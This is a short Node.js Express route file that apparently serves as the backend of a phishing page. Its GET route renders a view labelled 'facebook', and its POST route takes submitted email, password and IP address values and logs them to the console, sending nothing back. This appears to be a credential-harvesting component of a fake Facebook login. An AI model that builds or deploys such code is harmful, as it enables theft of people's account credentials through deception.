const router = require("express").Router();

router.get("/", (req, res) => {
  //   res.send("ui is working");
  res.render("index", { data: "facebook" });
});
router.post("/", (req, res) => {
  const { email, password, ipAddress } = req.body;
  console.log({ email }, "\n", { password }, "\n", { ipAddress }, "\n\n");
  //res.json({ message: "data received seccessfully" });
});

module.exports = router;
